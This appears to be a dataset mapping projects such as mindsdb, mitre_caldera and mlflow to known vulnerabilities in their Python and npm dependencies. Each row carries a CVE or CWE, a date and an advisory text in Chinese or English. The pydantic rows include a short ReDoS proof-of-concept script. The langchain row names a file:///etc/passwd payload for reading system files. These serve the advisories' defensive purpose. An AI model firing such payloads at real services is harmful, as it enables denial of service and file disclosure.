Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
mindsdb_mindsdb,tweepy,,True,CVE-2012-5825,CWE-20,2012-11-04,"Tweepy是Twitter API的Python库。
Tweepy中存在漏洞，该漏洞源于在主题Common Name（CN）或X.509证书的subjectAltName字段中，程序没有对服务器主机名与域名的匹配进行校验。中间人攻击者利用该漏洞通过任意有效的证书欺骗SSL服务器，与使用Python‘httplib’库有关。",3,0
mindsdb_mindsdb,scipy,,True,CVE-2013-4251,CWE-269,2013-10-17,"SciPy是SciPy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 0.12.1之前版本中存在安全漏洞。本地攻击者可利用该漏洞以运行‘scipy.weave’组件的用户权限执行任意代码。",2,0
mindsdb_mindsdb,scipy,,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
mindsdb_mindsdb,scipy,,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
mindsdb_mindsdb,xata,,True,,CWE-362,2023-08-03,"## Overview
[xata](https://pypi.org/project/xata) is a Python client for Xata.io

Affected versions of this package are vulnerable to Race Condition via the queue size in `flush_queue` which does not use the thread-safe queue size.
## Remediation
Upgrade `xata` to version 0.7.0 or higher.
## References
- [GitHub Issue](https://github.com/xataio/xata-py/issues/42)
- [GitHub PR](https://github.com/xataio/xata-py/pull/45)
",3,0
mindsdb_mindsdb,msal,,True,,CWE-943,2023-09-18,"## Overview
[msal](https://pypi.org/project/msal) is a The Microsoft Authentication Library (MSAL) for Python library

Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Data Query Logic due to improper input sanitisation in `authcode.py` file.
## Remediation
Upgrade `msal` to version 1.24.1 or higher.
## References
- [GitHub Commit](https://github.com/AzureAD/microsoft-authentication-library-for-python/commit/3427c2577bb674196a59e58cbf5aa91ad92cba7d)
",2,2
mindsdb_mindsdb,wheel,,True,CVE-2022-40898,CWE-20,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Packaging Authority (PyPA) Wheel 0.37.1版本及之前版本存在安全漏洞。攻击者利用该漏洞通过控制Wheel cli输入导致拒绝服务。",2,2
mindsdb_mindsdb,twine,,True,,CWE-601,2015-01-30,"## Overview
[`twine`](https://pypi.python.org/pypi/twine) is a Collection of utilities for interacting with PyPI.

Affected versions of this package are vulnerable to Open Redirection when uploading a library to pypi.

## References
- [GitHub Issue](https://github.com/pypa/twine/issues/92)
- [GitHub PR](https://github.com/pypa/twine/pull/94)
- [GitHub Commit](https://github.com/pypa/twine/commit/29e85757559154e919c9fe0a7f5803a425628855)
",3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2024-4741,CWE-416,2024-05-28,在某些情况下，调用OpenSSL API函数SSL_free_buffers可能导致访问已释放的内存。具体来说，当处理来自网络的记录时，如果记录头已接收但记录体尚未到达，或者记录数据部分被读取但缓冲区仍在使用的情况下调用SSL_free_buffers会成功，从而导致内存使用后释放的漏洞。,2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
mindsdb_mindsdb,cryptography,>=35.0,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mindsdb_mindsdb,cryptography,>=35.0,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mindsdb_mindsdb,cryptography,>=35.0,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2022-3786,CWE-120,2022-10-28,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。该漏洞源于X.509证书验证中的名称约束检查，攻击者利用该漏洞可以触发缓冲区溢出。,2,1
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2022-3602,CWE-787,2022-10-28,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，主要用于传输协议的加解密。在OpenSSL 3.0.0到3.0.6版本中，X.509证书验证的名称约束检查存在缓冲区溢出漏洞。,2,1
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-6237,CWE-606,2024-01-15,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0及更高版本存在安全漏洞，该漏洞源于调用EVP_PKEY_public_check（）函数并提供不可信的RSA密钥时容易受到拒绝服务（DOS）攻击。",3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-6129,CWE-440 CWE-787,2024-01-09,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0.0 到 3.0.12、3.1.0 到 3.1.4 和 3.2.0版本存在安全漏洞，该漏洞源于POLY1305 MAC算法存在安全问题。",3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-49083,CWE-476,2023-11-29,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python cryptography 3.1到 41.0.6版本存在代码问题漏洞，该漏洞源于加载 PKCS7 证书时可能会导致空指针取消引用和段错误。",3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2024-2511,CWE-1325,2024-04-08,OpenSSL是一个开源的能够实现安全套接层（SSL）和安全传输层（TLS）协议的通用加密库，常用于车云通信中对传输协议的加解密。该组件支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL组件在某些非默认的服务器配置下，TLSv1.3会话处理可能造成内存无限增长，进而导致拒绝服务。,3,0
mindsdb_mindsdb,cryptography,>=35.0,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
mindsdb_mindsdb,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
mindsdb_mindsdb,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
mindsdb_mindsdb,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
mindsdb_mindsdb,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
mindsdb_mindsdb,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
mindsdb_mindsdb,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
mindsdb_mindsdb,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
mindsdb_mindsdb,botocore,,True,,CWE-362,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Race Condition related to assuming a role for the first time.
## Remediation
Upgrade `botocore` to version 1.9.12 or higher.
## References
- [GitHub Commit](https://github.com/boto/botocore/commit/5e044f7b94acb83fce4265b5ce47620db70a9876)
- [GitHub PR](https://github.com/boto/botocore/pull/1405)
",3,0
mindsdb_mindsdb,langchain,0.3.27,True,,,,<p>Langchain 是一个基于 Python 的数据处理库，用于构建数据处理管道。该库中的 split_text_from_url 方法存在服务器端请求伪造漏洞，攻击者可以利用这一方法来访问敏感的服务器文件或执行恶意代码。攻击者只需提供特制的 URL，例如通过路径遍历载荷（如 file:///etc/passwd）或恶意的 data URI，即可绕过安全限制，从而导致对机密文件的未授权访问或通过注入的转换实现服务器的破坏。</p>,1,1
mindsdb_mindsdb,starlette,>=0.27,True,CVE-2024-47874,CWE-770,2024-10-15,<p>Starlette 是 Encode 开源的一个轻量级的 ASGI 框架/工具包，非常适合用 Python 构建异步 web 服务。Starlette 0.40.0 版本之前存在一个安全漏洞，源于缺乏对用户进行适当的访问控制和验证，可能允许未授权的用户访问受限资源。</p>,2,2
mindsdb_mindsdb,starlette,>=0.27,True,CVE-2025-54121,CWE-770,2025-07-21,Starlette 是一个快速的异步 Python Web 框架，常用于构建高性能的 Web 应用程序和 API。该漏洞涉及 Starlette 在解析多部件表单时处理大文件的机制，具体来说，当文件大小超过默认最大缓冲区大小时，Starlette 会将文件转存到磁盘，这一过程会阻塞主线程，导致无法接受新的连接。漏洞的成因是代码未能正确判断文件是否需要转存到磁盘，导致事件线程阻塞。,3,2
mindsdb_mindsdb,starlette,>=0.27,True,CVE-2025-62727,CWE-407,2025-10-28,"Starlette 是一个轻量级的 ASGI 框架和工具包，主要用于构建基于 Python 的异步 Web 服务。它支持高性能的异步请求处理，并提供如路由、中间件、静态文件服务等功能。

此漏洞出现在 Starlette 的 FileResponse 组件中，该组件用于处理文件响应，例如通过 StaticFiles 或直接使用 FileResponse 提供静态文件服务时。
在 0.49.1 版本之前，未经身份验证的攻击者可以发送一个精心构造的 HTTP Range 头，触发 FileResponse 的 Range 头解析和合并逻辑中的二次时间复杂度处理。具体来说，FileResponse 的 `_parse_range_header()` 方法在解析多范围请求时，使用的正则表达式存在 O(n^2) 的复杂度，导致处理时间显著增加。此外，合并逻辑通过扫描整个结果列表进一步放大了这种复杂度，从而使每个请求能够引发 CPU 资源的耗尽，导致拒绝服务攻击。
该漏洞的技术细节包括：
- 使用 `_RANGE_PATTERN` 正则表达式解析 Range 头部时，处理时间复杂度为 O(n^2)。
- 合并范围时，遍历结果列表进行比较，也会导致 O(n^2) 的处理时间。
攻击者可以通过构造包含多个小的、不重叠的范围或特定数字子串的 Range 头，最大化处理复杂度。
该问题影响所有使用 FileResponse 或 StaticFiles 提供文件服务的 Starlette 应用程序，同时也间接影响基于 Starlette 构建的框架，例如 FastAPI。",2,1
mindsdb_mindsdb,openpyxl,,True,CVE-2017-5992,CWE-611,2017-02-15,"Openpyxl是一个用于读写Excel 2010的Python库。
Openpyxl 2.4.1版本存在XML外部实体注入漏洞。远程攻击者可借助特制的文档利用该漏洞读取本地文件，造成应用程序拒绝服务。",3,0
mitre_caldera,safety,,True,CVE-2020-5252,CWE-807,2020-03-23,"Safety是一款基于Python的用于检查程序安全性的软件包。
Safety 1.8.6及之前版本中存在安全漏洞。攻击者可借助特制的软件包利用该漏洞绕过安全检查。",3,0
mitre_caldera,cross-spawn,7.0.3,False,CVE-2024-21538,CWE-1333,2024-11-08,cross-spawn 是一个用于在 Node.js 环境中跨平台地扩展 child_process.spawn 的开源软件包。该软件包在处理用户输入时存在正则表达式拒绝服务（ReDoS）漏洞，这是由于输入的正则表达式在解析时没有进行恰当的输入验证所导致。该漏洞存在于 7.0.5 版本之前的 cross-spawn 包中，如果攻击者提供了一个特殊构造的大型字符串作为输入，可能会在解析过程中导致 CPU 使用率飙升，从而造成程序卡顿或崩溃。,2,2
mitre_caldera,micromatch,4.0.5,False,CVE-2024-4067,CWE-1333,2024-05-13,NPM 包 `micromatch` 存在正则表达式拒绝服务 (ReDoS) 漏洞。漏洞出现在 `index.js` 文件中的 `micromatch.braces()` 函数中，由于模式 `.*` 会贪婪地匹配任何内容，攻击者可以通过传递恶意负载，使得模式匹配不断回溯输入，导致应用挂起或变慢。虽然已经合并了修复，但进一步测试表明问题依然存在。,3,2
mitre_caldera,braces,3.0.2,False,CVE-2024-4068,CWE-1050 CWE-400,2024-05-13,NPM 包 braces 3.0.3 之前的版本未能限制它可以处理的字符数量，这可能导致内存耗尽。在 lib/parse.js 文件中，如果恶意用户输入“不平衡的大括号”，解析过程会进入循环，导致程序开始分配堆内存而不释放它。最终，JavaScript 堆限制被达到，程序将崩溃。,2,2
mlflow_mlflow,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
mlflow_mlflow,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
mlflow_mlflow,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
mlflow_mlflow,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
mlflow_mlflow,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
mlflow_mlflow,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
mlflow_mlflow,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
mlflow_mlflow,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
mlflow_mlflow,pydantic,,True,CVE-2021-29510,CWE-835,2021-05-13,"pydantic是一个应用软件。使用Python类型提示进行数据验证和设置管理。
Pydantic 存在安全漏洞。该漏洞源于程序的验证将永远以100％的CPU使用率运行。",3,0
mlflow_mlflow,pydantic,,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
mlflow_mlflow,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

